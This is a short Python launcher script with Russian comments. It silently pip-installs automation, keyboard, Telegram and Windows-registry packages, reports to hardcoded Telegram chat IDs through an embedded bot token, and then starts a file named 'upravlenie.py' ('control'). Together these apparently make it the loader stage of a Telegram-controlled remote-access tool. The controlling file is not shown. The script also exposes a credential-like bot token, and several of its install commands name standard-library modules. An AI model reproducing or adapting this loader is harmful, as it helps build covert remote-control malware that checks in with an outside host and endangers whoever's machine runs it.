import os

os.system('pip install pyautogui')
os.system('pip install datetime')
os.system('pip install shutil')
os.system('pip install pyTelegramBotAPI')
os.system('pip install keyboard')
os.system('pip install ctypes') 
os.system('pip install winreg')

chat_id = 1215122907 #1 Доступ
chat_idd = 0 #2 Доступ

try:
    import telebot
    import os
    import datetime
    import webbrowser
    import shutil
    import pyautogui
    import subprocess
    import http.client
    import ctypes
    import winreg
    import sys

    from telebot import types

    
    bot = telebot.TeleBot("5437469847:AAFFj9d_p6gOUw4Tn_OB9qKcABCAIIhGcRs", parse_mode=None) #Токен

    bot.send_message(chat_id, "Все библиотеки присутствуют. Запуск основного файла")
    bot.send_message(chat_idd, "Все библиотеки присутствуют. Запуск основного файла")

    os.startfile("upravlenie.py")
    sys.exit(1)

except:
    import telebot

    bot = telebot.TeleBot("5437469847:AAFFj9d_p6gOUw4Tn_OB9qKcABCAIIhGcRs", parse_mode=None) #Токен

    bot.send_message(chat_id, "Какой то библиотеки не хватает!")
    bot.send_message(chat_idd, "Какой то библиотеки не хватает!")

    exit()